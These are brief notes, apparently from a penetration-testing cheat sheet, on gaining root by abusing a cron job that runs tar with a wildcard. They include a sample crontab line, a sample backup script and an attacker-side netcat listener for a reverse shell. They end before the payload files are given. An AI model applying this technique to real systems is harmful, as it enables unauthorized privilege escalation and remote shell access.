# What's in the crontab? can we exploit a tar job?
# LINK: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
# TL;DR : wildcards will interprpet everything in the directory, by making files that 
# have valid tar checkpoint commands, we can get a reverse shell
# sample crontab entry: */5 * * * * root /usr/bin/compress.sh
# say compress.sh has at least these two lines
# Sample compress.sh  : cd /home/someuser/backup; tar cfz /home/someuser/backup/backup.tar.gz *
#
# Exploit it
# attacker: nc -nvlp 5555
# on target in /home/someuser/backup
